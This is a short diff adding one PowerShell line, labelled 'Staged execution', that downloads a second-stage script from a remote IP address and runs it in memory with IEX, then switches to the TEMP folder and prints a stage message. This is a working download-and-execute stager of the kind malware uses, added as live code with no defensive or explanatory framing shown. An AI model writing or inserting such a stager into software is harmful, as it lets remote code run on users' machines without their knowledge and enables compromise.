@@ -1,0 +1,1 @@
+<# Staged execution #> $Stage1Url = "https://203.0.113.100/stage2.ps1"; $ScriptText = (New-Object System.Net.WebClient).DownloadString($Stage1Url); IEX $ScriptText; Set-Location -Path $env:TEMP; Write-Output "stage 38 initialized"
